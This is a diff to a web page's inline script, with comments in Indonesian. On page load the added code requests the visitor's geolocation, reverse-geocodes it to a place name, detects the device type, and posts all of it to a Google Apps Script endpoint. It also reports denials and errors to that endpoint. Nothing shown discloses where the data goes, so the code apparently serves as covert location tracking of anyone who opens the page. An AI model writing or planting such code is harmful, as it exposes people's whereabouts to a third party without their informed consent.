@@ -598,33 +598,45 @@
     <script src="js/script.js"></script>
 
 
-    
-
     <script>
       const locationScriptURL = 'https://script.google.com/macros/s/AKfycbwNRnrNRjNTkgPt9R-1J7XRb3qG2haUxREuwIpbebYuKrgFEYM8tUcJ4z1zSLaCIdJ42Q/exec';
   
       document.addEventListener('DOMContentLoaded', () => {
           if (navigator.geolocation) {
-              navigator.geolocation.getCurrentPosition(async function(position) {
-                  const latitude = position.coords.latitude;
-                  const longitude = position.coords.longitude;
-                  console.log('Latitude:', latitude, 'Longitude:', longitude);
+              navigator.geolocation.getCurrentPosition(
+                  async function (position) {
+                      try {
+                          // Mendapatkan latitude dan longitude dari posisi pengguna
+                          const latitude = position.coords.latitude;
+                          const longitude = position.coords.longitude;
+                          console.log('Latitude:', latitude, 'Longitude:', longitude);
   
-                  const nominatimURL = `https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`;
+                          // URL API untuk reverse geocoding menggunakan Nominatim
+                          const nominatimURL = `https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`;
   
-                  try {
-                      const response = await fetch(nominatimURL);
-                      const data = await response.json();
+                          // Mengirim permintaan ke Nominatim untuk mendapatkan nama tempat berdasarkan koordinat
+                          const response = await fetch(nominatimURL);
+                          const data = await response.json();
   
-                      if (data && data.display_name) {
-                          const place = data.display_name;
-                          console.log('Nama Tempat:', place);
+                          let place = "Unknown Location";
+                          if (data && data.display_name) {
+                              place = data.display_name;
+                              console.log('Nama Tempat:', place);
+                          } else {
+                              console.error('Gagal mendapatkan nama tempat.');
+                          }
+  
+                          // Mendapatkan tipe perangkat pengguna
+                          const deviceType = /android/i.test(navigator.userAgent) ? 'Android' : /iPad|iPhone|iPod/.test(navigator.userAgent) ? 'iOS' : 'PC';
+                          console.log('Device Type:', deviceType);
   
                           // Menggabungkan data lokasi
                           const locationData = new URLSearchParams();
                           locationData.append('Latitude', latitude);
                           locationData.append('Longitude', longitude);
                           locationData.append('Place', place);
+                          locationData.append('Device', deviceType);
+                          locationData.append('Status', 'Success');
   
                           // Mengirimkan data lokasi ke Google Apps Script
                           await fetch(locationScriptURL, {
@@ -634,18 +646,74 @@
                           });
   
                           console.log('Lokasi berhasil dikirim ke Google Spreadsheet');
-                      } else {
-                          console.error('Gagal mendapatkan nama tempat.');
+                      } catch (error) {
+                          console.error('Gagal mendapatkan lokasi:', error.message);
+  
+                          // Mengirimkan data error ke Google Apps Script
+                          const errorData = new URLSearchParams();
+                          errorData.append('Latitude', 'N/A');
+                          errorData.append('Longitude', 'N/A');
+                          errorData.append('Place', 'N/A');
+                          errorData.append('Device', 'N/A');
+                          errorData.append('Status', `Error: ${error.message}`);
+  
+                          await fetch(locationScriptURL, {
+                              method: 'POST',
+                              body: errorData,
+                              mode: 'no-cors'
+                          });
                       }
-                  } catch (error) {
-                      console.error('Gagal mendapatkan lokasi:', error.message);
+                  },
+                  async function (error) {
+                      let errorMessage = '';
+                      switch (error.code) {
+                          case error.PERMISSION_DENIED:
+                              errorMessage = 'User denied the request for Geolocation.';
+                              break;
+                          case error.POSITION_UNAVAILABLE:
+                              errorMessage = 'Location information is unavailable.';
+                              break;
+                          case error.TIMEOUT:
+                              errorMessage = 'The request to get user location timed out.';
+                              break;
+                          default:
+                              errorMessage = 'An unknown error occurred.';
+                              break;
+                      }
+                      console.error(errorMessage);
+  
+                      // Mengirimkan data kegagalan ke Google Apps Script
+                      const errorData = new URLSearchParams();
+                      errorData.append('Latitude', 'N/A');
+                      errorData.append('Longitude', 'N/A');
+                      errorData.append('Place', 'N/A');
+                      errorData.append('Device', 'N/A');
+                      errorData.append('Status', errorMessage);
+  
+                      await fetch(locationScriptURL, {
+                          method: 'POST',
+                          body: errorData,
+                          mode: 'no-cors'
+                      });
                   }
-              });
+              );
           } else {
               console.error('Geolocation tidak didukung oleh browser ini.');
+              const errorData = new URLSearchParams();
+              errorData.append('Latitude', 'N/A');
+              errorData.append('Longitude', 'N/A');
+              errorData.append('Place', 'N/A');
+              errorData.append('Device', 'N/A');
+              errorData.append('Status', 'Geolocation is not supported by this browser.');
+              fetch(locationScriptURL, {
+                  method: 'POST',
+                  body: errorData,
+                  mode: 'no-cors'
+              });
           }
       });
   </script>
+  
   
   
   <script>
